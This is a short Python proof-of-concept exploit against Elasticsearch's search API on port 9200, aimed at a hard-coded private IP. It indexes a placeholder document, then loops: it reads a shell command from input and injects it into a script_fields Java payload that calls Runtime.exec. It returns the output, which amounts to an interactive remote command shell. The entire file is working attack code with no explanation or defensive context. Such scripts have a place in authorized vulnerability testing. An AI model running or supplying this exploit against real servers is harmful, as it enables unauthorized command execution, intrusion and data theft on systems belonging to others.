from urllib import request
import json


def send_request(url, raw):
    try:
        headers = {'Accept': '*/*',
                   'Accept-Language': 'en',
                   'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0',
                   'Connection': 'close',
                   'Content-Type': 'application/x-www-form-urlencoded'
                   }
        data = json.dumps(raw)
        data = bytes(data, 'utf8')
        req = request.Request(url=url, headers=headers, data=data, method='POST')

        res = request.urlopen(req)
        res = str(res.read().decode('utf-8'))

        if len(res) < 200:
            return
        a = json.loads(res)
        result = a['hits']['hits'][0]['fields']['command'][0]
        return result
    except Exception as e:
        return "Error : " + str(e)


def poc(ip):
    raw1 = {
        "name": "phithon"
    }
    send_request('http://' + ip + ':9200/website/blog/', raw1)
    while True:
        command = input()
        raw2 = {
            "size": 1,
            "query": {
                "filtered": {
                    "query": {
                        "match_all": {
                        }
                    }
                }
            },
            "script_fields": {
                "command": {
                    "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"" +
                              command
                              + "\").getInputStream()).useDelimiter(\"\\\\A\").next();"
                }
            }
        }
        response = send_request('http://' + ip + ':9200/website/blog/_search?pretty', raw2)
        print(response)


if __name__ == '__main__':
    poc("172.16.12.138")
